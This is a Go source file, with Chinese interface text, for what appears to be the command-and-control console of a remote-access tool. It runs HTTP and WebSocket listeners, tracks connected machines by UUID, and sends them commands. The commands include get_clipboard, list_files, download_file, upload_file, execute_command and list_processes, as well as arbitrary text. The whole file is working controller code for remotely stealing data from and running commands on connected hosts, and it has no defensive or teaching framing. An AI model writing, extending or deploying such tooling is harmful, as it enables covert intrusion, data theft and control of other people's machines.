package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/chzyer/readline"
	"github.com/fatih/color"
	"github.com/gorilla/websocket"
	"github.com/google/uuid"
)

type Client struct {
	Conn *websocket.Conn
	UUID string
	Addr string
}

type ClientManager struct {
	Clients         map[string]*Client
	mu              sync.RWMutex
	addClientChan   chan *Client
	removeClientChan chan string
	messageChan     chan Message
}

type Message struct {
	UUID    string
	Content string
}

var availableCommands = []string{
	"list_files", "get_clipboard", "download_file", "upload_file", "execute_command", "list_processes", "help",
}

func NewClientManager() *ClientManager {
	return &ClientManager{
		Clients:         make(map[string]*Client),
		addClientChan:   make(chan *Client),
		removeClientChan: make(chan string),
		messageChan:     make(chan Message),
	}
}

func (cm *ClientManager) Start() {
	for {
		select {
		case client := <-cm.addClientChan:
			cm.mu.Lock()
			cm.Clients[client.UUID] = client
			cm.mu.Unlock()
			fmt.Printf("新连接: %s, UUID: %s\n", client.Addr, client.UUID)

		case uuid := <-cm.removeClientChan:
			cm.mu.Lock()
			delete(cm.Clients, uuid)
			cm.mu.Unlock()
			fmt.Printf("连接关闭: UUID: %s\n", uuid)

		case msg := <-cm.messageChan:
			cm.mu.RLock()
			if client, exists := cm.Clients[msg.UUID]; exists {
				response := map[string]string{"command": msg.Content}
				data, _ := json.Marshal(response)
				if err := client.Conn.WriteMessage(websocket.TextMessage, data); err != nil {
					fmt.Printf("发送消息失败: %v\n", err)
				} else {
					fmt.Printf("消息已发送给 UUID: %s, 内容: %s\n", msg.UUID, msg.Content)
				}
			} else {
				fmt.Printf("未找到连接: %s\n", msg.UUID)
			}
			cm.mu.RUnlock()
		}
	}
}

func httpHandler(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintln(w, "HTTP server is running")
}

func wsHandler(cm *ClientManager, conn *websocket.Conn) {
	defer conn.Close()

	address := conn.RemoteAddr().String()
	newUUID := uuid.New().String()
	client := &Client{Conn: conn, UUID: newUUID, Addr: address}

	cm.addClientChan <- client
	successMessage := map[string]string{"status": "success", "message": "连接成功", "uuid": newUUID}
	data, _ := json.Marshal(successMessage)
	conn.WriteMessage(websocket.TextMessage, data)

	for {
		_, message, err := conn.ReadMessage()
		if err != nil {
			cm.removeClientChan <- newUUID
			break
		}
		fmt.Printf("收到来自 %s 的消息: %s\n", address, message)
	}
}

func listClients(cm *ClientManager) []string {
	cm.mu.RLock()
	defer cm.mu.RUnlock()
	var uuids []string
	for _, client := range cm.Clients {
		uuids = append(uuids, client.UUID)
	}
	return uuids
}

func sendMessageToClient(cm *ClientManager, uuid, message string) {
	cm.messageChan <- Message{UUID: uuid, Content: message}
}

func printUseCommandHelp() {
	color.Set(color.FgCyan)
	fmt.Println("可用命令:")
	for _, cmd := range availableCommands {
		fmt.Printf("  %s\n", cmd)
	}
	color.Unset()
}

func printHelp() {
	color.Set(color.FgCyan)
	fmt.Println("可用命令:")
	fmt.Println("  http            启动HTTP服务")
	fmt.Println("  websocket       启动WebSocket服务")
	fmt.Println("  list websocket  列出所有活动的WebSocket连接")
	fmt.Println("  use <UUID>     与特定的WebSocket连接交互（通过UUID）")
	fmt.Println("  help           显示此帮助信息")
	color.Unset()
}

func handleUseCommand(cm *ClientManager, uuid string) {
	if client, exists := cm.Clients[uuid]; exists {
		config := readline.Config{
			Prompt: fmt.Sprintf("输入要给 %s 发送的消息 (输入 'back' 或 'bk' 返回): ", client.Conn.RemoteAddr().String()),
			AutoComplete: readline.NewPrefixCompleter(
				readline.PcItem("list_files"),
				readline.PcItem("get_clipboard"),
				readline.PcItem("download_file"),
				readline.PcItem("upload_file"),
				readline.PcItem("execute_command"),
				readline.PcItem("list_processes"),
				readline.PcItem("help"),
			),
		}
		rl, err := readline.NewEx(&config)
		if err != nil {
			fmt.Println("初始化 readline 失败:", err)
			return
		}
		defer rl.Close()

		for {
			line, err := rl.Readline()
			if err != nil {
				break
			}

			message := strings.TrimSpace(line)

			if message == "back" || message == "bk" {
				break
			}

			// Handle special commands
			switch message {
			case "list_files", "get_clipboard", "download_file", "upload_file", "execute_command", "list_processes":
				sendMessageToClient(cm, uuid, message)
			case "help":
				printUseCommandHelp()
			default:
				sendMessageToClient(cm, uuid, message)
			}
		}
	} else {
		color.Set(color.FgRed)
		fmt.Println("未找到该连接")
		color.Unset()
	}
}

func main() {
	cm := NewClientManager()
	go cm.Start()

	config := readline.Config{
		Prompt:       "输入命令: ",
		HistoryFile:  ".readline.tmp",
		AutoComplete: readline.NewPrefixCompleter(
			readline.PcItem("http"),
			readline.PcItem("websocket"),
			readline.PcItem("list", readline.PcItem("websocket")),
			readline.PcItem("use"),
			readline.PcItem("help"),
		),
	}

	rl, err := readline.NewEx(&config)
	if err != nil {
		fmt.Println("初始化 readline 失败:", err)
		return
	}
	defer rl.Close()

	// Tab 补全功能
	go func() {
		for {
			uuids := listClients(cm)
			completers := make([]readline.PrefixCompleterInterface, len(uuids))
			for i, id := range uuids {
				completers[i] = readline.PcItem(id)
			}
			rl.Config.AutoComplete = readline.NewPrefixCompleter(
				readline.PcItem("http"),
				readline.PcItem("websocket"),
				readline.PcItem("list", readline.PcItem("websocket")),
				readline.PcItem("use", completers...),
				readline.PcItem("help"),
			)
			time.Sleep(time.Second) // 每秒更新一次
		}
	}()

	for {
		line, err := rl.Readline()
		if err != nil {
			break
		}

		command := strings.TrimSpace(line)

		switch {
		case strings.HasPrefix(command, "use "):
			uuid := strings.TrimSpace(strings.TrimPrefix(command, "use "))
			handleUseCommand(cm, uuid)
		case command == "http":
			go http.ListenAndServe(":8080", http.HandlerFunc(httpHandler))
			color.Set(color.FgYellow)
			fmt.Println("HTTP服务已启动在8080端口")
			color.Unset()
		case command == "websocket":
			http.HandleFunc("/ws", func(w http.ResponseWriter, r *http.Request) {
				upgrader := websocket.Upgrader{}
				upgrader.CheckOrigin = func(r *http.Request) bool { return true }
				conn, err := upgrader.Upgrade(w, r, nil)
				if err != nil {
					fmt.Println("升级到WebSocket失败:", err)
					return
				}
				wsHandler(cm, conn)
			})
			go http.ListenAndServe(":8081", nil)
			color.Set(color.FgYellow)
			fmt.Println("WebSocket服务已启动在8081端口")
			color.Unset()
		case command == "list websocket":
			uuids := listClients(cm)
			fmt.Println("活动的WebSocket会话:")
			for _, uuid := range uuids {
				fmt.Println("UUID:", uuid)
			}
		case command == "help":
			printHelp()
		default:
			color.Set(color.FgRed)
			fmt.Println("无效命令，请重新输入.")
			color.Unset()
		}
	}
}
